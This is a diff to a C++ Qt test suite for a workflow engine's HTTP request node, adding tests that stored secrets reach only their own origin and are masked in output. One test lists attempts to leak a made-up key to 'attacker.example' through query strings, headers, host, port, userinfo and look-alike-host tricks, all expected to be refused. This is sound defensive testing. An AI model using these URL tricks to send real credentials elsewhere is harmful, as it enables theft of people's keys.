@@ -73,10 +73,13 @@ class TestHttpRequestNode : public QObject {
     }
 
     // One run of the node program: the inputs the engine would give it, with the defaults filled in.
-    Answer call(const QString &path, QJsonObject inputs = {}) {
+    // `secrets` is what the runner puts in the request for the pack's declared names (#402); made-up values only.
+    Answer call(const QString &path, QJsonObject inputs = {}, const QJsonObject &secrets = {}) {
         if (!inputs.contains("url"))
             inputs.insert("url", QString(m_server.origin()) + path);
-        const QJsonObject request{{"protocol", 1}, {"op", "run"}, {"id", "r1:request"}, {"inputs", inputs}};
+        QJsonObject request{{"protocol", 1}, {"op", "run"}, {"id", "r1:request"}, {"inputs", inputs}};
+        if (!secrets.isEmpty())
+            request.insert("secrets", secrets);
         QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
         env.insert("FUGUE_PROTOCOL", "1");
         const QByteArray out = spawn(kPack + "/request/run.sh", {}, json(request), env);
@@ -280,18 +283,126 @@ private slots:
         QVERIFY(call("/text").ok); // http://127.0.0.1 is allowed
     }
 
-    void aSecretIsNotSupportedYetInTheUrlTheHeadersOrTheBody() {
+    // What the runner puts in the request for a stored secret: the value and the origin the person set it for.
+    QJsonObject secret(const QString &value, const QString &origin = {}) const {
+        return {{"value", value}, {"origin", origin.isEmpty() ? QString(m_server.origin()) : origin}};
+    }
+
+    // {secret:token_1} fills a header and the URL, for the origin it was set for, and the value never comes back.
+    void aSecretFillsAHeaderAndTheUrlForItsOwnOriginAndNeverComesBackInTheAnswer() {
+        const QString key = "made-up-key-4711";
+        m_server.on("GET", "/key/made-up-key-4711", [](const HttpRequest &) { return HttpResponse{200, "{\"ok\":true}"}; });
+        const QJsonObject secrets{{"token_1", secret(key)}, {"token_2", secret("other-made-up-5")}};
+        QJsonObject inputs = postJson("{\"x\": 1}");
+        inputs.insert("headers", "X-Api-Key: {secret:token_1}\nAuthorization: Bearer {secret:token_2}");
+        const Answer answer = call("/hook", inputs, secrets);
+        QVERIFY2(answer.ok, qPrintable(answer.message));
+        QCOMPARE(QString::fromUtf8(m_server.requestsTo("POST", "/hook").last().headers.value("x-api-key")), key); // the server got it
+        const QString body = answer.outputs.value("body").toString(); // the fake server echoes the header back
+        QVERIFY2(!body.contains(key) && !body.contains("other-made-up-5"), qPrintable(body));
+        QVERIFY(body.contains("***"));
+        QVERIFY(!QJsonDocument(answer.outputs).toJson().contains(key.toUtf8()));
+
+        const Answer inUrl = call("/key/{secret:token_1}", {{"path1", "ok"}}, secrets);
+        QVERIFY2(inUrl.ok, qPrintable(inUrl.message));
+        QCOMPARE(inUrl.outputs.value("field1").toString(), QString("true")); // the path was /key/<value>
+    }
+
+    // A workflow author must not be able to send the person's key anywhere else: every way to name another address is
+    // refused before a connection, so nothing reaches the server (and nothing leaves the machine).
+    void aSecretIsNeverSentToAnotherOriginHoweverTheAddressIsMade() {
         const int before = m_server.requests().size();
-        for (const char *field : {"headers", "body"}) {
-            QJsonObject inputs{{"method", "POST"}, {"body_kind", "text"}, {"body", ""}, {"headers", ""}};
-            inputs.insert(field, QString(field) == "headers" ? "Authorization: Bearer {secret:API_KEY}" : "key={secret:API_KEY}");
-            const Answer answer = call("/hook", inputs);
-            QVERIFY(!answer.ok);
-            QCOMPARE(answer.code, QString("not_supported"));
-            QVERIFY2(answer.message.contains("Secrets are not supported yet"), qPrintable(answer.message));
+        const QJsonObject secrets{{"token_1", secret("made-up-key-4711", "https://api.example.com")}};
+        struct Case { const char *name; QJsonObject inputs; };
+        const QList<Case> cases{
+            {"the key in the query of another host", {{"url", "https://attacker.example/c?k={secret:token_1}"}}},
+            {"the key in a header to another host", {{"url", "https://attacker.example/c"}, {"headers", "X-Key: {secret:token_1}"}}},
+            {"the key in the host", {{"url", "https://{secret:token_1}.attacker.example/"}}},
+            {"the key in the port", {{"url", "https://api.example.com:{secret:token_1}/"}}},
+            {"the key in the user name", {{"url", "https://{secret:token_1}@api.example.com/"}}},
+            {"a host from an input", {{"url", "https://{a}/c"}, {"a", "attacker.example"}, {"headers", "X-Key: {secret:token_1}"}}},
+            {"a host that ends like the origin", {{"url", "https://api.example.com.attacker.example/c?k={secret:token_1}"}}},
+            {"a userinfo trick", {{"url", "https://api.example.com@attacker.example/c?k={secret:token_1}"}}},
+            {"a port from an input", {{"url", "https://api.example.com:{a}/c"}, {"a", "8443"}, {"headers", "X-Key: {secret:token_1}"}}},
+            {"a scheme from an input", {{"url", "{a}://api.example.com/c"}, {"a", "https"}, {"headers", "X-Key: {secret:token_1}"}}},
+            {"plain http to the same host", {{"url", "http://api.example.com/c"}, {"headers", "X-Key: {secret:token_1}"}}},
+            {"another port of the same host", {{"url", "https://api.example.com:8443/c"}, {"headers", "X-Key: {secret:token_1}"}}},
+            {"the loopback fake server", {{"url", QString(m_server.origin()) + "/hook"}, {"headers", "X-Key: {secret:token_1}"}}},
+        };
+        for (const Case &each : cases) {
+            const Answer answer = call({}, each.inputs, secrets);
+            QVERIFY2(!answer.ok, each.name);
+            QVERIFY2(answer.code == "bad_input", qPrintable(QString("%1: %2 %3").arg(each.name, answer.code, answer.message)));
+            QVERIFY2(!answer.message.contains("made-up-key-4711"), each.name);
         }
-        QVERIFY(!call("/x/{secret:API_KEY}").ok);
+        QVERIFY2(call({}, {{"url", "https://attacker.example/c?k={secret:token_1}"}}, secrets).message.contains("only for https://api.example.com"),
+                 "the message says where the key may go");
         QCOMPARE(m_server.requests().size(), before);
+    }
+
+    // A secret stored without an origin (an old file) is not used: the node says so, and nothing is sent.
+    void aSecretWithNoOriginIsNotUsed() {
+        const int before = m_server.requests().size();
+        const Answer answer = call("/hook", {{"method", "POST"}, {"headers", "X-Api-Key: {secret:token_1}"}},
+                                   {{"token_1", QJsonObject{{"value", "made-up-key-4711"}, {"origin", ""}}}});
+        QVERIFY(!answer.ok);
+        QCOMPARE(answer.code, QString("secret_missing"));
+        QCOMPARE(m_server.requests().size(), before);
+    }
+
+    // A secret is filled once from the template; an input that holds the text is just text, and never expands.
+    void anInputThatSaysSecretIsNotExpanded() {
+        const QJsonObject secrets{{"token_1", secret("made-up-key-4711")}};
+        const Answer answer = call("/hook", {{"method", "POST"}, {"body_kind", "text"}, {"body", "{a}"}, {"a", "{secret:token_1}"}}, secrets);
+        QVERIFY2(answer.ok, qPrintable(answer.message));
+        QVERIFY(QString::fromUtf8(m_server.requestsTo("POST", "/hook").last().body).contains("{secret:token_1}"));
+        QVERIFY(!QString::fromUtf8(m_server.requestsTo("POST", "/hook").last().body).contains("made-up-key-4711"));
+        const Answer inHeader = call("/hook", {{"method", "POST"}, {"headers", "X-Note: {a}"}, {"a", "{secret:token_1}"}}, secrets);
+        QVERIFY2(inHeader.ok, qPrintable(inHeader.message));
+        QCOMPARE(QString::fromUtf8(m_server.requestsTo("POST", "/hook").last().headers.value("x-note")), QString("{secret:token_1}"));
+    }
+
+    void aSecretInTheBodyIsRefusedBeforeAnyConnection() {
+        const int before = m_server.requests().size();
+        const Answer answer = call("/hook", {{"method", "POST"}, {"body_kind", "text"}, {"body", "key={secret:token_1}"}},
+                                   {{"token_1", secret("made-up-key-4711")}});
+        QVERIFY(!answer.ok);
+        QCOMPARE(answer.code, QString("bad_input"));
+        QVERIFY2(answer.message.contains("body"), qPrintable(answer.message));
+        QVERIFY(!answer.message.contains("made-up-key-4711"));
+        QCOMPARE(m_server.requests().size(), before);
+    }
+
+    void aSecretThePackDoesNotDeclareOrHasNotSetIsAnErrorThatNamesItAndLeaksNothing() {
+        const int before = m_server.requests().size();
+        const QJsonObject secrets{{"token_1", secret("made-up-key-4711")}};
+        Answer answer = call("/hook", {{"headers", "X-Api-Key: {secret:api_key}"}}, secrets);
+        QVERIFY(!answer.ok);
+        QCOMPARE(answer.code, QString("bad_input")); // not one of token_1 to token_3
+        QVERIFY2(answer.message.contains("token_1") && !answer.message.contains("made-up-key-4711"), qPrintable(answer.message));
+        answer = call("/hook", {{"headers", "X-Api-Key: {secret:token_3}"}}, secrets);
+        QVERIFY(!answer.ok);
+        QCOMPARE(answer.code, QString("secret_missing"));
+        QVERIFY2(answer.message.contains("Settings > Packs"), qPrintable(answer.message));
+        answer = call("/hook", {{"headers", "X-Api-Key: {secret:token_1}"}}); // nothing handed over at all
+        QCOMPARE(answer.code, QString("secret_missing"));
+        answer = call("/x/{secret:Token 1}", {}, secrets); // not a secret name
+        QCOMPARE(answer.code, QString("bad_input"));
+        QCOMPARE(m_server.requests().size(), before); // refused before any connection
+    }
+
+    void aSecretInAnErrorMessageOrAServersEchoIsMaskedAlsoPercentEncoded() {
+        // The message of a failed call names the host, never the path the secret was in.
+        const QString origin = QString(m_server.origin()).replace(QRegularExpression(":[0-9]+$"), ":1");
+        const Answer answer = call({}, {{"url", origin + "/{secret:token_1}"}}, {{"token_1", secret("made-up/key 4711", origin)}});
+        QVERIFY(!answer.ok);
+        QCOMPARE(answer.code, QString("network_error"));
+        QVERIFY2(!answer.message.contains("made-up/key 4711") && !answer.message.contains("made-up%2Fkey%204711"), qPrintable(answer.message));
+        // A server that echoes the encoded path back.
+        m_server.on("GET", "/echo/made-up%2Fkey%204711", [](const HttpRequest &request) { return HttpResponse{200, request.path}; });
+        const Answer echoed = call("/echo/{secret:token_1}", {}, {{"token_1", secret("made-up/key 4711")}});
+        QVERIFY2(echoed.ok, qPrintable(echoed.message));
+        QCOMPARE(echoed.outputs.value("body").toString(), QString("/echo/***"));
     }
 
     void aHeaderValueCannotCarryALineBreakInFromAnInput() {
